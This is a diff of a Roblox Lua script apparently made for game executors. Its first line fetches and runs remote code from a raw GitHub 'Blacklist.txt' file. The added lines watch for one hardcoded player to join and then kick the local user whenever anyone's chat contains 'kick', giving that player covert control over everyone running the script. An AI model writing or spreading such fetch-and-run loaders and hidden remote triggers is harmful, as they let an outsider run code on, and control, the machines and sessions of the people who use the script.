@@ -1,14 +1,19 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Blacklist.txt"))()
 
 
-local Sound = Instance.new("Sound",game:GetService("SoundService"))
-Sound.SoundId = "rbxassetid://8819872349"
-Sound:Play()
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "Key Has Been Changed";
-	Text = "Please Check In My Discord Server";
-	Icon = "rbxthumb://type=Asset&id=9915433572&w=150&h=150"})
-Duration = 16;
+local name = "EJGAMINGGGXXXDYT" --// Change "playerName" with the name of the person u want to check for that joins
+
+game:GetService'Players'.PlayerAdded:Connect(function(player)
+if player.Name == name then
+for i,v in pairs(game.Players:GetPlayers()) do
+    game.Players[v.Name].Chatted:connect(function(chat)
+        if chat:match("kick") then
+            game.Players.LocalPlayer:Kick("Kicked By Premium User")
+        end
+    end)
+end
+end
+end)
 
 
 
